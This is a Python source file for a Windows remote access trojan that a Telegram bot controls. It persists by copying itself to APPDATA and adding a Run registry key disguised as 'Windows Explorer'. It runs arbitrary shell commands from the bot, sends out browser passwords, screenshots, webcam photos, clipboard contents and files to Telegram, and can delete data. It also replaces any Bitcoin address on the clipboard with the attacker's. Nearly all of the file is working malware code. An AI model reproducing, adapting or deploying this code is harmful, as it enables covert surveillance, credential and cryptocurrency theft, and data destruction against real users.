import time
#from cv2 import *
import requests
import os
import sys
import pyautogui
import detailes
import os.path
import subprocess
import re
import platform
#def Hide():
#    import win32gui, win32con

#    the_program_to_hide = win32gui.GetForegroundWindow()
#    win32gui.ShowWindow(the_program_to_hide, win32con.SW_HIDE)
def move():
    APPDATA = os.environ['appdata']
    new_file_name = os.environ['appdata'] + "\\" + os.path.basename(sys.argv[0])
    if not os.path.exists(new_file_name):
        #import urllib.request
        #urllib.request.urlretrieve(
        #    "https://media.istockphoto.com/photos/abstract-warning-of-a-detected-malware-program-picture-id1299483011",
        #    "pic.png")
        #subprocess.Popen("pic.png", shell=True)
        new_loc = os.path.join(APPDATA, os.path.basename(sys.argv[0]))
        subprocess.Popen(f'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v "Windows Explorer" /t REG_SZ /d "{new_file_name}"',shell=True)
        command = f'timeout 1 & move /y {os.path.basename(sys.argv[0])} {new_loc} & cd /d {APPDATA}\\ & {new_loc}'
        subprocess.Popen(command, shell=True)
        sys.exit(0)
#Hide()
move()
def Pcinfor():
    Username = os.environ['username']
    GetDesktopname = platform.node()
    cmd = 'wmic csproduct get uuid'
    uuid = subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
    re = requests.post("https://api.telegram.org/bot" + detailes.api_key + "/sendMessage?chat_id=" + detailes.Chat_id + "&text=Bot Active: " + Username+"\n"+"DesktopName: "+GetDesktopname)
def command_checker(command):
    pc_name = os.getenv('username')
    #result = type(subprocess.check_output(command,shell=True))
    result = subprocess.Popen(command,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
    result = result.stdout.read()+result.stderr.read()
    result = str(result,"utf-8")
    #print(result)
    return "Pc Username : "+pc_name+"\n\n"+result


def commands(command_text):
    pc_name = str(os.getenv('username'))
    user_command = str(command_text)
    if pc_name in user_command or "getall " in user_command or "active" in user_command:
        if "getall " in user_command:
            user_command = user_command[7:]
        elif user_command=="active":
            user_command=user_command
        else:
            get = len(pc_name)+1
            user_command = user_command[get:]
        if user_command == "dir":
            path = os.path.realpath(sys.argv[0])
            command_output = command_checker("dir /b")
            re = requests.post(
                "https://api.telegram.org/bot" + detailes.api_key + "/sendMessage?chat_id=" + detailes.Chat_id + "&text=" + path + "\n\n" + command_output)

            # return command_output
        elif user_command == "ipconfig":
            command_output = command_checker(user_command)
            re = requests.post(
                "https://api.telegram.org/bot" + detailes.api_key + "/sendMessage?chat_id=" + detailes.Chat_id + "&text=" + command_output)

        elif user_command == "allpass":
            # os.chdir(tem_dick)
            import tempfile
            tempdirectory = tempfile.gettempdir()
            # url = "https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe"
            # import urllib.request
            try:
                #    pc_name = os.getenv('username')
                #    re = requests.post(
                "https://api.telegram.org/bot" + detailes.api_key + "/sendMessage?chat_id=" + detailes.Chat_id + "&text=Please Bro Wait Collecting Information Of "
                #    urllib.request.urlretrieve(url,'notepad.exe')
                #    result = subprocess.getoutput("notepad.exe all")
                #    os.remove("notepad.exe")
                import nomo
                result = nomo.main()
                import telepot
                bot = telepot.Bot(detailes.api_key)

                # here replace chat_id and test.jpg with real things
                bot.sendDocument(detailes.Chat_id, document=open(tempdirectory+'\\BrowserData.txt', 'rb'))
                os.remove(tempdirectory+'\\BrowserData.txt')
            except:
                pc_name = os.getenv('username')
                re = requests.post(
                    "https://api.telegram.org/bot" + detailes.api_key + "/sendMessage?chat_id=" + detailes.Chat_id + "&text=" + pc_name+"'s Antivirus is enabled")
        elif user_command == "ss":
            import tempfile
            tempDick = tempfile.gettempdir()
            myScreenshot = pyautogui.screenshot()
            myScreenshot.save(tempDick+'\\screenshot_1.png')
            import telepot
            bot = telepot.Bot(detailes.api_key)

            # here replace chat_id and test.jpg with real things
            re = requests.post(
                "https://api.telegram.org/bot" + detailes.api_key + "/sendMessage?chat_id=" + detailes.Chat_id + "&text=" + pc_name)

            bot.sendDocument(detailes.Chat_id, document=open(tempDick+'\\screenshot_1.png', 'rb'))
            pc_name = os.getenv('username')
            os.remove(tempDick+'\\screenshot_1.png')
        elif "cd " in user_command:
            dirloaction = user_command[3:]
            os.chdir(dirloaction)
            currentdic = command_checker("echo %cd%")
            result = command_checker("dir /b")
            result =  currentdic + "\n\n" + result
            re = requests.post(
                "https://api.telegram.org/bot" + detailes.api_key + "/sendMessage?chat_id=" + detailes.Chat_id + "&text=" + result)
        elif "cd .." == user_command:
            os.chdir(user_command[3:])
            currentdic = command_checker("echo %cd%")
            result = command_checker("dir /b")
            result1 = currentdic + "\n\n" + result
            re = requests.post(
                "https://api.telegram.org/bot" + detailes.api_key + "/sendMessage?chat_id=" + detailes.Chat_id + "&text="+result1)

        elif "download " in user_command:
            try:
                import telepot
                bot = telepot.Bot(detailes.api_key)
                user_command = user_command[9:]
                re = requests.post(
                        "https://api.telegram.org/bot" + detailes.api_key + "/sendMessage?chat_id=" + detailes.Chat_id + "&text=Wait sending the file")
                bot.sendDocument(detailes.Chat_id, document=open(user_command, 'rb'))
            except:
                re = requests.post(
                    "https://api.telegram.org/bot" + detailes.api_key + "/sendMessage?chat_id=" + detailes.Chat_id + "&text=File Not Found")

        elif user_command == "clip":
            result = subprocess.Popen('powershell -command "Get-Clipboard"',shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
            result = result.stdout.read() + result.stderr.read()
            result = str(result, "utf-8")
            re = requests.post(
                "https://api.telegram.org/bot" + detailes.api_key + "/sendMessage?chat_id=" + detailes.Chat_id + "&text=" + result)
        elif user_command == "exit":
            sys.exit(0)
        elif "zip " in user_command:
            user_command = user_command[3:]
            command = "tar.exe -a -cf"+user_command
            subprocess.Popen(command,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
            path = os.path.realpath(sys.argv[0])
            command_output = command_checker("dir /b")
            re = requests.post(
                "https://api.telegram.org/bot" + detailes.api_key + "/sendMessage?chat_id=" + detailes.Chat_id + "&text=" + path + "\n\n" + command_output)
        elif "delete " in user_command:
            if os.path.exists(user_command[7:]):
                if os.path.isdir(user_command[7:]):
                    command = subprocess.Popen("rmdir /s /q "+user_command[7:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                               stdin=subprocess.PIPE)
                    path = command_checker("echo %cd%")
                    time.sleep(1)
                    command_output = command_checker("dir /b")
                    re = requests.post(
                        "https://api.telegram.org/bot" + detailes.api_key + "/sendMessage?chat_id=" + detailes.Chat_id + "&text=" + path + "\n\n" + "Folder Deleted Successfully \n" + command_output)
                else:
                    command = subprocess.Popen("del "+user_command[7:],shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
                    path = command_checker("echo %cd%")
                    time.sleep(1)
                    command_output = command_checker("dir /b")
                    re = requests.post("https://api.telegram.org/bot" + detailes.api_key + "/sendMessage?chat_id=" + detailes.Chat_id + "&text=" + path + "\n\n"+"File Deleted Successfully \n" + command_output)
            else:
                path = os.path.realpath(sys.argv[0])
                command_output = command_checker("dir /b")
                re = requests.post("https://api.telegram.org/bot" + detailes.api_key + "/sendMessage?chat_id="+detailes.Chat_id+"&text=Pc Name: "+pc_name+"\n"+"Cannot Delete")
        elif user_command == "active":
            Pcinfor()
        elif user_command == "webcam":
            # initialize the camera
            from cv2 import VideoCapture
            from cv2 import imwrite
            from cv2 import waitKey
            # If you have multiple camera connected with
            # current device, assign a value in cam_port
            # variable according to that
            cam_port = 0
            cam = VideoCapture(cam_port)

            # reading the input using the camera
            result, image = cam.read()

            # If image will detected without any error,
            # show result
            import tempfile
            tempDick = tempfile.gettempdir()
            if result:

                # showing result, it take frame name and image
                # output
                # imshow("GeeksForGeeks", image)

                # saving image in local storage
                imwrite(tempDick+"\\webpic.png", image)

                # If keyboard interrupt occurs, destroy image
                # window
                waitKey(0)
                import telepot
                bot = telepot.Bot(detailes.api_key)

                # here replace chat_id and test.jpg with real things
                re = requests.post(
                    "https://api.telegram.org/bot" + detailes.api_key + "/sendMessage?chat_id=" + detailes.Chat_id + "&text=" + pc_name)

                bot.sendDocument(detailes.Chat_id, document=open(tempDick + '\\webpic.png', 'rb'))
                os.remove(tempDick + '\\webpic.png')
                #destroyWindow("GeeksForGeeks")

            # If captured image is corrupted, moving to else part
            else:
                print("No image detected. Please! try again")
        else:
            result = subprocess.Popen(user_command,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
            result = result.stdout.read() + result.stderr.read()
            result = str(result, "utf-8")
            re = requests.post(
                "https://api.telegram.org/bot" + detailes.api_key + "/sendMessage?chat_id=" + detailes.Chat_id + "&text=" + result)
def btcs():
    from hashlib import sha256
    import subprocess
    import detailes
    digits58 = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz'
    pc_name = str(os.getenv('username'))
    def decode_base58(bc, length):
        n = 0
        for char in bc:
            n = n * 58 + digits58.index(char)
        return n.to_bytes(length, 'big')


    def check_bc(bc):
        try:
            bcbytes = decode_base58(bc, 25)
            return bcbytes[-4:] == sha256(sha256(bcbytes[:-4]).digest()).digest()[:4]
        except Exception:
            return False


    result = subprocess.Popen('powershell -command "Get-Clipboard"',shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
    result = result.stdout.read() + result.stderr.read()
    result = str(result.strip(),"utf-8")
    if '#' in result or '(' in result or ')' in result or '{' in result or '}' in result or '[' in result or ']' in result or '"' in result or "'" in result:
        result = '1'
    else:
        bitcoinadd = check_bc(result)
        if bitcoinadd==True:
            com = 'echo '+detailes.bitcoin+'| clip'
            subprocess.Popen(com,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
            re = requests.post("https://api.telegram.org/bot" + detailes.api_key + "/sendMessage?chat_id=" + detailes.Chat_id + "&text=Bit Coin Addreas Changed\nFrom: "+result+"\nTo: "+detailes.bitcoin+"\nDesktopName: "+pc_name)
        else:
            pass
Pcinfor()
import tempfile
tempDick = tempfile.gettempdir()
#print(tempDick)
while True:
    try:
        btcs()
        idfile_read = None
        url = "https://api.telegram.org/bot" + detailes.api_key + "/getUpdates?offset=-1"
        v = requests.get(url).text

        #print(v)
        massage_id = re.search('"message_id":(.*),"from"', v)
        massage_id_ = massage_id.group(1)
        # print(massage_id_)
        if "/" in v or "zip " in v or " download " in v or ".py" in v or ".zip" in v:
            text = re.search('"text":"(.*)","e', v)
            text_ = text.group(1)
            #print(text_)
        else:
            text = re.search('"text":"(.*)"}}]}', v)
            text_ = text.group(1)
            #print(text_)
        try:
            idfile = open(tempDick + "\\id.txt", "r")
            idfile_read = idfile.read()
            idfile.close()
        except:
            pass
        if massage_id_ == idfile_read:
            pass
        elif idfile_read == None:
            pass
        else:
            #print(text_)
            commands(text_)
        idfile = open(tempDick + "\\id.txt", "w")
        idfile.write(massage_id_)
        idfile.close()
    except Exception as e:
        print(e)
        time.sleep(2)
        #break